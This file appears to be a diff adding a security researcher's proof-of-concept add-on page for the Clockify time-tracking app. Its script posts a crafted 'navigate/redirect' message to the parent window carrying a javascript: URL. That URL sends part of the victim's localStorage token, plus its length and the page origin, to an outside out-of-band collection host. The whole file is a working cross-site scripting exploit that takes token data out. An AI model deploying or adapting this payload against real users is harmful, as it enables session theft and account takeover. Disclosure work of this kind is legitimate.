@@ -1,0 +1,16 @@
+<!doctype html><html><body>
+<b>CakeSec PoC add-on component</b><div id=s>sending navigate/redirect...</div>
+<script>
+// JavaScript that Clockify will run on app.clockify.me (benign PoC: change the tab title and
+// send only the FIRST 20 characters + the length of the victim's token to Burp Collaborator)
+var p = "javascript:void(document.title='CAKESEC-XSS-'+document.domain);" +
+        "void(fetch('https://xplvbepzzbdlokcfrppb3c964cxc6mwrk.oast.fun/clockify-xss?origin='+encodeURIComponent(location.origin)" +
+        "+'&tok20='+encodeURIComponent((localStorage.getItem('token')||'').slice(0,20))" +
+        "+'&len='+(localStorage.getItem('token')||'').length,{mode:'no-cors'}))";
+function go(){
+  // the hidden message type: action "navigate", type "redirect", param = our javascript: link
+  window.top.postMessage(JSON.stringify({action:'navigate',payload:{type:'redirect',param:p}}),'*');
+  document.getElementById('s').textContent='sent';
+}
+setTimeout(go, 2500);   // wait until Clockify has finished loading
+</script></body></html>
